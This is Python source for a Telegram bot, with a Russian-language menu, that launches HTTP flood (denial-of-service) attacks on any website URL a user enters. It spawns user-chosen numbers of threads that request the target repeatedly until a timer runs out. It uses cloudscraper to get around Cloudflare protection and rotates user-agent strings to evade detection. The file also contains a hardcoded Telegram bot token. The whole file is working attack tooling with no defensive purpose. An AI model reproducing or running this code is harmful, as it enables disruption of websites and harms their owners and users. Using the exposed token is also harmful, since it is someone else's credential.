import telebot
from telebot import types
import threading
import cloudscraper
import datetime
import random

stop_attack = False

def generate_user_agent():
    user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G992U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4692.87 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1158.57",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4758.102 Safari/537.36 Edg/99.0.1108.56",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G992U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4692.87 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4664.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.77 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
     ]

    return random.choice(user_agents)

def launch_attack(url, threads, attack_time):
    global stop_attack
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(attack_time))
    threads_count = 0
    scraper = cloudscraper.create_scraper()
    while threads_count <= int(threads) and not stop_attack and (datetime.datetime.now() < until):
        try:
            th = threading.Thread(target=attack_cfb, args=(url, until, scraper))
            th.start()
            threads_count += 1
        except:
            pass

def attack_cfb(url, until_datetime, scraper):
    global stop_attack
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0 and not stop_attack:
        try:
            headers = {"User-Agent": generate_user_agent()}
            scraper.get(url, headers=headers, timeout=10)
        except:
            pass

bot = telebot.TeleBot("6416778466:AAE-6BXpeqb6yxHsTbsEqAPbbQ2GpXe0OBs")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, " development @fyuman666 подпишитесь на канал чтобы использовать бота - @info_fyuman")

@bot.message_handler(commands=['menu'])
def menu(message):
    keyboard = types.InlineKeyboardMarkup()
    callback_button_attack = types.InlineKeyboardButton(text="Начать атаку", callback_data="attack")
    callback_button_stop = types.InlineKeyboardButton(text="Остановить атаку", callback_data="stop")
    keyboard.add(callback_button_attack, callback_button_stop)
    bot.send_message(message.chat.id, "Выберите действие:", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global stop_attack
    if call.data == "attack":
        bot.send_message(call.message.chat.id, "Введите сайт для атаки:")
        bot.register_next_step_handler(call.message, attack_url)
    elif call.data == "stop":
        stop_attack = True
        bot.send_message(call.message.chat.id, "Атака остановлена❎")

def attack_url(message):
    global stop_attack
    url = message.text
    bot.send_message(message.chat.id, "threads:")
    bot.register_next_step_handler(message, attack_threads, url)

def attack_threads(message, url):
    global stop_attack
    threads = message.text
    bot.send_message(message.chat.id, "attack time only 300 seconds :")
    bot.register_next_step_handler(message, attack_time, url, threads)

def attack_time(message, url, threads):
    global stop_attack
    attack_time = message.text
    bot.send_message(message.chat.id, f"attack successfull⚠️! {url} using {threads} threads for {attack_time} second.")
    stop_attack = False
    threading.Thread(target=launch_attack, args=(url, threads, attack_time)).start()

bot.polling()
